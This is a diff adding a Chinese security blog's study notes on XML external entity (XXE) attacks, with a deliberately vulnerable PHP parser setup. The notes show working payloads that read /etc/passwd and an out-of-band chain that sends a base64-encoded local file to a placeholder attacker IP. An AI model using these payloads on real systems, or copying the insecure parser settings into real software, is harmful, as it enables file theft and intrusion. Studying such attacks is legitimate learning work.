@@ -1,0 +1,390 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>XXE 学习笔记 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="XXE 学习笔记 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="本文所用的测试代码
+&lt;?php
+$input = &lt;&lt;&lt;STR
+# 这里写XML
+STR;
+;
+
+# 设置libxml库的实体加载器为false，可能会处理来自请求XML中定义的外部实体。
+libxml_disabl..." />
+    <meta name="keywords" content="XXE,学习笔记" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              XXE 学习笔记
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-07-03
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/e-swS2vOK/" class="post-tag">
+                  # XXE
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/SBvbIXKgV/" class="post-tag">
+                  # 学习笔记
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/xxe-xue-xi.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>本文所用的测试代码</p>
+<pre><code class="language-php">&lt;?php
+$input = &lt;&lt;&lt;STR
+# 这里写XML
+STR;
+;
+
+# 设置libxml库的实体加载器为false，可能会处理来自请求XML中定义的外部实体。
+libxml_disable_entity_loader (false);   
+$xmlfile = $input;
+$dom = new DOMDocument(); 
+# 加载XML数据。选项LIBXML_NOENT和LIBXML_DTDLOAD分别表示启用实体替换和加载DTD。
+$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+# SimpleXMLElement对象使得处理XML数据更加简单    
+$creds = simplexml_import_dom($dom);
+# 打印整个XML文档
+echo $creds-&gt;asXML();
+</code></pre>
+<h1 id="背景知识">背景知识</h1>
+<h2 id="概念">概念</h2>
+<ul>
+<li><strong>XML</strong>：即可扩展标记语言（Extensible Markup Language），被设计用于在网络上进行信息传输和存储。</li>
+<li><strong>XXE</strong>：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。</li>
+<li><strong>DTD</strong>：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)。</li>
+</ul>
+<h2 id="xxe-payload-格式">XXE Payload 格式</h2>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1688388975658.jpg" alt="" loading="lazy"></figure>
+<h2 id="dtd的使用主要的攻击方式">DTD的使用（主要的攻击方式</h2>
+<h3 id="dtd的引用方式">DTD的引用方式</h3>
+<p>在XML文档中，可以通过两种方式引用DTD：内部引用和外部引用。</p>
+<p><strong>内部DTD</strong>：直接在XML文档中定义DTD。这通常发生在XML文档的声明部分，紧接着在根元素之前。定义内部DTD的语法如下：</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root-element [ 
+&lt;!-- DTD 内容 --&gt; 
+]&gt; 
+&lt;root-element&gt;
+    &lt;!-- XML 文档内容 --&gt;
+&lt;/root-element&gt;
+</code></pre>
+<p>比如：</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE user [
+    &lt;!ELEMENT user ANY &gt;
+]&gt;
+&lt;user&gt;
+    &lt;username&gt;admin&lt;/username&gt;
+    &lt;password&gt;admin&lt;/password&gt;
+&lt;/user&gt;
+</code></pre>
+<p><strong>外部DTD</strong>：在外部文件中定义DTD，并在XML文档中通过URI引用。外部DTD可以在多个XML文档中重复使用。定义外部DTD的语法如下：</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root-element SYSTEM &quot;URL&quot;&gt; 
+&lt;root-element&gt;
+    &lt;!-- XML 文档内容 --&gt;
+&lt;/root-element&gt;
+</code></pre>
+<h3 id="dtd实体声明重点">DTD实体声明（重点）</h3>
+<p>DTD实体（Entity）是一种机制，可以用于定义XML中可重用的字符串或代码片段。</p>
+<p>实体通常可以分为两种类型：内部实体和外部实体。</p>
+<p><strong>内部实体</strong>：内部实体是在DTD中定义并在XML文档中使用的实体。它的定义方法如下</p>
+<pre><code class="language-xml">&lt;!ENTITY xxe &quot;skyblu3&quot;&gt;
+</code></pre>
+<p>这个实体在XML文档中通过<code>&amp;实体名称;</code>的方式引用</p>
+<pre><code class="language-xml">&lt;username&gt;&amp;xxe;&lt;/username&gt;
+</code></pre>
+<p><strong>外部实体</strong>：外部实体是在DTD中定义但其内容存储在外部文件中的实体。外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：<br>
+<img src="https://skyblu3519.github.io/post-images/1688391829123.png" alt="" loading="lazy"></p>
+<p>使用方法：</p>
+<pre><code class="language-xml">&lt;!ENTITY xxe SYSTEM &quot;URI/URL&quot;&gt;
+</code></pre>
+<p>例子：</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+    &lt;!ELEMENT foo ANY &gt;
+    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;user&gt;
+    &lt;username&gt;&amp;xxe;&lt;/username&gt;
+    &lt;password&gt;admin&lt;/password&gt;
+&lt;/user&gt;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/1688392068149.png" alt="" loading="lazy"></figure>
+<p>除了内部实体和外部实体，XML还有一个比较特殊的实体：<strong>实体参数</strong>。</p>
+<p>上面的实体都是用于XML文档中的，而实体参数则是用于在DTD中定义可重用的字符串或代码片段。</p>
+<p>实体参数的声明和实体一样有内部和外部两种</p>
+<pre><code class="language-xml">&lt;!ENTITY % name &quot;&lt;!ENTITY xxe 'skyblue3'&gt;&quot;&gt;
+&lt;!ENTITY % name SYSTEM &quot;URI&quot;&gt;
+</code></pre>
+<p>实体参数通过<code>%name;</code>来引用</p>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [
+    &lt;!ELEMENT foo ANY &gt;
+    &lt;!ENTITY % name &quot;&lt;!ENTITY xxe 'skyblue3'&gt;&quot;&gt;
+    %name;
+]&gt;
+&lt;user&gt;
+    &lt;username&gt;&amp;xxe;&lt;/username&gt;
+    &lt;password&gt;admin&lt;/password&gt;
+&lt;/user&gt;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/1688393743432.png" alt="" loading="lazy"></figure>
+<p>来看下外部引入，在<code>xml.dtd</code>写入</p>
+<pre><code class="language-xml">&lt;!ENTITY xxe &quot;skyblue3&quot;&gt;
+</code></pre>
+<p>外部引用这个实体参数，与上面达到同样的效果</p>
+<pre><code class="language-xml">    &lt;!ENTITY % name SYSTEM &quot;file:///tmp/xml.dtd&quot;&gt;
+    %name;
+</code></pre>
+<h1 id="攻击思路">攻击思路</h1>
+<p>从上面的例子对XXE最大的感受就是，它可以请求指定URL/URI的内容，并在条件允许的情况下把请求的内容加载出来。所以XXE能做的事还是非常多的（DDoS，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等）。</p>
+<p>一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。</p>
+<p>这里以文件读取来测试有回显和无回显两种情况。</p>
+<h2 id="有回显">有回显</h2>
+<p>有回显的情况很好理解，之前的例子中已经有了。</p>
+<p>还可以利用实体参数来做，在evil.dtd中写入</p>
+<pre><code class="language-xml">&lt;!ENTITY evil SYSTEM &quot;file:///Users/ea5ter/tmp/flag&quot; &gt;
+</code></pre>
+<p>像这样引用</p>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [
+    &lt;!ELEMENT foo ANY &gt;
+        &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;
+        %dtd;
+]&gt;
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/1688397164769.jpg" alt="" loading="lazy"></figure>
+<h2 id="无回显">无回显</h2>
+<p>将测试代码中的<code>echo $creds-&gt;asXML();</code>注释掉。</p>
+<p>对于无回显的情况，需要使用外部实体将数据带出来。具体操作如下：</p>
+<p>编写<code>evil.dtd</code>，放在服务器上。</p>
+<pre><code class="language-xml">&lt;!ENTITY % all
+&quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://ip:9999/?data=%file;'&gt;&quot;
+&gt;
+%all;
+</code></pre>
+<p>DTD部分：</p>
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///Users/ea5ter/tmp/flag&quot;&gt;
+&lt;!ENTITY % dtd SYSTEM &quot;http://IP/evil.dtd&quot;&gt;
+%dtd;
+%send;
+</code></pre>
+<p>整个流程如下：</p>
+<ol>
+<li>解析器首先解析XML文档的DTD。在这个过程中，它遇到了<code>%file</code>实体的定义，于是解析器读取指定的文件，并将其内容转换为Base64格式。</li>
+<li>解析器然后处理<code>%dtd</code>实体的定义。首先从指定的URL加载<code>evil.dtd</code>文件，并解析其中的内容。在这个过程中，遇到了<code>%all</code>实体的定义，于是它创建了一个名为<code>%send</code>的实体。</li>
+<li>最后，处理<code>%send</code>实体的引用。这导致解析器向服务器发送了一个请求，请求参数<code>data</code>的值是<code>%file</code>实体的值。</li>
+</ol>
+<p>数据顺利外带<br>
+<img src="https://skyblu3519.github.io/post-images/1688397567862.png" alt="" loading="lazy"></p>
+<p>不过这里我还是有点疑问，为什么<code>%send</code>一定要写在外部实体中？直接写出来就不行呢？🤔</p>
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///Users/ea5ter/tmp/flag&quot;&gt;
+&lt;!ENTITY % send SYSTEM &quot;http://IP:9999/?p=%file;&quot;&gt;
+%send;
+</code></pre>
+<p>之后搜索一下🔍</p>
+<blockquote>
+<p>One Day Later......</p>
+</blockquote>
+<p>现在来回答上面这个问题，主要涉及两个DTD的规则。</p>
+<p>首先，实体参数在同一个DTD中不能在<strong>声明</strong>中引用，只能位于其他声明之间。</p>
+<pre><code class="language-xml">&lt;!ENTITY % name &quot;skkyblu3&quot;&gt;
+&lt;!ENTITY xxe &quot;%name;&quot;&gt;
+</code></pre>
+<p>所以上面的<code>xxe</code>并不会被替换为<code>&lt;!ENTITY xxe &quot;skkyblu3&quot;&gt;</code>，相反解析这个DTD会产生报错。这种类型的替换形式（在声明中进行替换）只能用于DTD外部子集。</p>
+<p>要做到上面的替换，我们需要在一个外部dtd中写入：</p>
+<pre><code class="language-xml">&lt;!ENTITY xxe &quot;%name;&quot;&gt;
+</code></pre>
+<p>再去加载</p>
+<pre><code class="language-xml">&lt;!ENTITY % name &quot;skkyblu3&quot;&gt;
+&lt;!ENTITY % dtd SYSTEM &quot;http://IP/sky.dtd&quot;&gt;
+%dtd;
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://skyblu3519.github.io/post-images/1688440284008.png" alt="" loading="lazy"></figure>
+<p>因此，payload中读取到的<code>%file;</code>就只能通过引入外部的参数实体<code>http://ip/evil.dtd</code>，在这个外部实体中加载。</p>
+<p>在知道引入外部参数实体的原因后，我们再看到<code>evil.dtd</code>的写法</p>
+<pre><code class="language-xml">&lt;!ENTITY % all
+&quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://ip:9999/?data=%file;'&gt;&quot;
+&gt;
+%all;
+</code></pre>
+<p>这里的<code>send</code>是定义在<code>all</code>这个<strong>内部参数实体</strong>中的，为什么不能直接写出来呢？像下面这样</p>
+<pre><code class="language-xml">&lt;!ENTITY % send SYSTEM &quot;http://ip:9999/?data=%file;&quot;&gt;
+</code></pre>
+<p>这是因为XML规范规定，参数实体不能<strong>直接用于构成URI</strong>。这意味着<code>SYSTEM &quot;http://ip:9999/?data=%file;&quot;</code>这里是不能直接使用<code>%file;</code>的。</p>
+<p>所以需要用<code>all</code>这个内部参数实体来引入<code>send</code>，再使用<code>%all;</code>来展开这个实体。</p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://itpcb.com/a/1885669">DTD实体之参数实体</a><br>
+<a href="https://xz.aliyun.com/t/3357#toc-8">一篇文章带你深入理解漏洞之 XXE 漏洞</a><br>
+<a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247489349&amp;idx=1&amp;sn=ab435be65bc6c35a21ea4bd040693d8c&amp;source=41">歪？我想要一个XXE。</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86">背景知识</a>
+<ul>
+<li><a href="#%E6%A6%82%E5%BF%B5">概念</a></li>
+<li><a href="#xxe-payload-%E6%A0%BC%E5%BC%8F">XXE Payload 格式</a></li>
+<li><a href="#dtd%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%BB%E8%A6%81%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F">DTD的使用（主要的攻击方式</a>
+<ul>
+<li><a href="#dtd%E7%9A%84%E5%BC%95%E7%94%A8%E6%96%B9%E5%BC%8F">DTD的引用方式</a></li>
+<li><a href="#dtd%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E%E9%87%8D%E7%82%B9">DTD实体声明（重点）</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">攻击思路</a>
+<ul>
+<li><a href="#%E6%9C%89%E5%9B%9E%E6%98%BE">有回显</a></li>
+<li><a href="#%E6%97%A0%E5%9B%9E%E6%98%BE">无回显</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/python-pickle-fan-xu-lie-hua-lou-dong/">
+              <h3 class="post-title">
+                Python Pickle反序列化漏洞学习笔记
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
